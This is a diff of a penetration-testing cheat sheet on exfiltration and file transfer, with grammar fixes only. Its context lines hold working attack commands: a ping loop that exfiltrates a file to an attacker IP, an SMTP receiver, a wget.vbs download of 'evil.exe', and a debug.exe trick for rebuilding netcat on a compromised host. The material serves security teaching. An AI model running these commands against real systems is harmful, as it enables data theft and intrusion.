@@ -250,7 +250,7 @@ thanks to **@BinaryShadow\_**
 ### **ICMP**
 
 ```bash
-#In order to exfiltrate the content of a file via pings you can do:
+# To exfiltrate the content of a file via pings you can do:
 xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
 #This will 4bytes per ping packet (you could probably increase this until 16)
 ```
@@ -269,7 +269,7 @@ sniff(iface="tun0", prn=process_packet)
 
 ### **SMTP**
 
-If you can send data to an SMTP server, you can create a SMTP to receive the data with python:
+If you can send data to an SMTP server, you can create an SMTP to receive the data with python:
 
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
@@ -277,7 +277,7 @@ sudo python -m smtpd -n -c DebuggingServer :25
 
 ### TFTP
 
-By default in XP and 2003 (in others it need to be explicitly added during installation)
+By default in XP and 2003 (in others it needs to be explicitly added during installation)
 
 In Kali, **start TFTP server**:
 
@@ -351,7 +351,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 
 ### Debug.exe
 
-This is a crazy technique that works on Windows 32 bit machines. Basically the idea is to use the `debug.exe` program. It is used to inspect binaries, like a debugger. But it can also rebuild them from hex. So the idea is that we take a binaries, like `netcat`. And then disassemble it into hex, paste it into a file on the compromised machine, and then assemble it with `debug.exe`.
+This is a crazy technique that works on Windows 32 bit machines. The idea is to use the `debug.exe` program. It is used to inspect binaries, like a debugger. But it can also rebuild them from hex. So the idea is that we take binaries, like `netcat`. And then disassemble it into hex, paste it into a file on the compromised machine, and then assemble it with `debug.exe`.
 
 `Debug.exe` can only assemble 64 kb. So we need to use files smaller than that. We can use upx to compress it even more. So let's do that:
 
@@ -359,7 +359,7 @@ This is a crazy technique that works on Windows 32 bit machines. Basically the i
 upx -9 nc.exe
 ```
 
-Now it only weights 29 kb. Perfect. So now let's disassemble it:
+Now it only weighs 29 kb. Perfect. So now let's disassemble it:
 
 ```
 wine exe2bat.exe nc.exe nc.txt
